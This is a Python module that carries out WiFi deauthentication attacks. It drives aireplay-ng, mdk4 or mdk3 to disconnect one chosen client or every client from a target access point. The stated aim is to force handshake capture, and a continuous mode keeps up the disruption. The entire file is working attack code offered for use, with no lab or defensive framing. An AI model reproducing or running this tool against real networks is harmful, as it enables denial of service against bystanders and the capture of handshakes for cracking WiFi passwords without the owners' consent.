#!/usr/bin/env python3
"""
WiFi Deauthentication Attack
============================

Performs deauth attacks to force handshake capture.
"""

import subprocess
import time
import os
import signal
from typing import Optional, List
from dataclasses import dataclass


@dataclass
class DeauthResult:
    """Result of deauth attack"""
    success: bool
    packets_sent: int
    duration: float
    message: str


class DeauthAttacker:
    """WiFi deauthentication attacker"""

    def __init__(self, interface: str):
        self.interface = interface
        self.attack_process = None

    def deauth_network(
        self,
        bssid: str,
        client: Optional[str] = None,
        count: int = 10,
        reason: int = 7
    ) -> DeauthResult:
        """
        Send deauth packets to disconnect clients

        Args:
            bssid: Target AP BSSID
            client: Specific client MAC (None for broadcast to all clients)
            count: Number of deauth packets to send
            reason: Deauth reason code (7 = Class 3 frame received from nonassociated station)

        Returns:
            DeauthResult with attack results
        """
        start_time = time.time()

        # Try aireplay-ng first (most reliable)
        if self._command_exists('aireplay-ng'):
            result = self._deauth_with_aireplay(bssid, client, count, reason)
        # Try mdk4 as fallback
        elif self._command_exists('mdk4'):
            result = self._deauth_with_mdk4(bssid, count)
        # Try mdk3 as another fallback
        elif self._command_exists('mdk3'):
            result = self._deauth_with_mdk3(bssid, count)
        else:
            return DeauthResult(
                success=False,
                packets_sent=0,
                duration=time.time() - start_time,
                message="No deauth tools found (install aircrack-ng, mdk4, or mdk3)"
            )

        result.duration = time.time() - start_time
        return result

    def _command_exists(self, command: str) -> bool:
        """Check if command exists"""
        try:
            subprocess.run(
                ['which', command],
                capture_output=True,
                check=True
            )
            return True
        except:
            return False

    def _deauth_with_aireplay(
        self,
        bssid: str,
        client: Optional[str],
        count: int,
        reason: int
    ) -> DeauthResult:
        """Deauth using aireplay-ng"""

        # Build command
        cmd = [
            'aireplay-ng',
            '--deauth', str(count),
            '-a', bssid,
            '-D',  # Don't wait for ACK (faster)
            self.interface
        ]

        # Add client if specified
        if client:
            cmd.extend(['-c', client])

        # Add reason code
        cmd.extend(['-r', str(reason)])

        try:
            # Run aireplay-ng
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30
            )

            # Parse output for packet count
            packets_sent = count

            if result.returncode == 0:
                target = f"client {client}" if client else "all clients"
                return DeauthResult(
                    success=True,
                    packets_sent=packets_sent,
                    duration=0,  # Will be set by caller
                    message=f"Sent {packets_sent} deauth packets to {target} on {bssid}"
                )
            else:
                return DeauthResult(
                    success=False,
                    packets_sent=0,
                    duration=0,
                    message=f"Deauth failed: {result.stderr}"
                )

        except subprocess.TimeoutExpired:
            return DeauthResult(
                success=False,
                packets_sent=0,
                duration=0,
                message="Deauth attack timed out"
            )
        except Exception as e:
            return DeauthResult(
                success=False,
                packets_sent=0,
                duration=0,
                message=f"Deauth error: {str(e)}"
            )

    def _deauth_with_mdk4(self, bssid: str, count: int) -> DeauthResult:
        """Deauth using mdk4"""
        import tempfile

        # Create target file
        temp_file = tempfile.NamedTemporaryFile(mode='w', delete=False)
        temp_file.write(bssid + '\n')
        temp_file.close()

        try:
            # Run mdk4
            process = subprocess.Popen(
                ['mdk4', self.interface, 'd', '-b', temp_file.name, '-c', '1'],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )

            # Let it run for a bit
            time.sleep(count * 0.1)  # Approximate timing

            # Kill process
            process.terminate()
            process.wait(timeout=2)

            os.unlink(temp_file.name)

            return DeauthResult(
                success=True,
                packets_sent=count,
                duration=0,
                message=f"Sent ~{count} deauth packets using mdk4"
            )

        except Exception as e:
            try:
                os.unlink(temp_file.name)
            except:
                pass

            return DeauthResult(
                success=False,
                packets_sent=0,
                duration=0,
                message=f"mdk4 error: {str(e)}"
            )

    def _deauth_with_mdk3(self, bssid: str, count: int) -> DeauthResult:
        """Deauth using mdk3"""
        import tempfile

        # Create target file
        temp_file = tempfile.NamedTemporaryFile(mode='w', delete=False)
        temp_file.write(bssid + '\n')
        temp_file.close()

        try:
            # Run mdk3
            process = subprocess.Popen(
                ['mdk3', self.interface, 'd', '-b', temp_file.name],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )

            # Let it run for a bit
            time.sleep(count * 0.1)

            # Kill process
            process.terminate()
            process.wait(timeout=2)

            os.unlink(temp_file.name)

            return DeauthResult(
                success=True,
                packets_sent=count,
                duration=0,
                message=f"Sent ~{count} deauth packets using mdk3"
            )

        except Exception as e:
            try:
                os.unlink(temp_file.name)
            except:
                pass

            return DeauthResult(
                success=False,
                packets_sent=0,
                duration=0,
                message=f"mdk3 error: {str(e)}"
            )

    def continuous_deauth(
        self,
        bssid: str,
        clients: Optional[List[str]] = None,
        interval: float = 1.0
    ):
        """
        Start continuous deauth attack

        Args:
            bssid: Target AP BSSID
            clients: List of specific clients (None for broadcast)
            interval: Interval between deauth bursts in seconds
        """
        import threading

        def attack_loop():
            while self.attack_process:
                if clients:
                    for client in clients:
                        self.deauth_network(bssid, client, count=5)
                else:
                    self.deauth_network(bssid, None, count=5)

                time.sleep(interval)

        self.attack_process = threading.Thread(target=attack_loop, daemon=True)
        self.attack_process.start()

    def stop_deauth(self):
        """Stop continuous deauth attack"""
        if self.attack_process:
            self.attack_process = None
            time.sleep(0.5)  # Give it time to stop
